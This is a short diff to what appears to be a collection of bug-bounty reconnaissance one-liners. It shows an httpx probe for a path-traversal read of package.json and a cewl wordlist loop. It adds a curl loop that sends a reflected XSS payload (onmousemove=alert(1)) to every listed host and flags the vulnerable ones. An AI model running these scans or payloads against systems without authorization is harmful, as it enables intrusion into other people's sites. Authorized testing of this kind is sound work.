@@ -212,3 +212,5 @@ httpx -l subs.txt -path "/assets/built%2F..%2F..%2F/package.json" -status-code -
 
 while read -r domain; do cewl "$domain" >> wordlist.txt; done < activesubdomains.txt
 
+cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
+
